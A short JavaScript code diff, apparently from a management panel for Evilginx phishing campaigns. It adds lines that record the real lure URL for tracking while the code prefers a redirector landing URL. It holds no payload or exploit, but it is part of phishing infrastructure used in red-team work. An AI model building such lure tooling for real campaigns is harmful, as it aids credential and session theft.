@@ -2119,6 +2119,10 @@ function autoCreateDefaultLure(phishletName, hostname) {
                                             if (finalStrikesData && finalStrikesData.success && finalStrikesData.data) {
                                                 var updatedLure = finalStrikesData.data.find(function (s) { return s.id == latest.id; });
                                                 if (updatedLure) {
+                                                    // Store the actual evilginx URL for tracking purposes
+                                                    var actualUrl = updatedLure.url || "";
+                                                    $("#actualLureUrl").val(actualUrl);
+
                                                     // Use landing_url if available (contains redirector info), otherwise use url
                                                     finalUrl = updatedLure.landing_url || updatedLure.url || finalUrl;
                                                 }
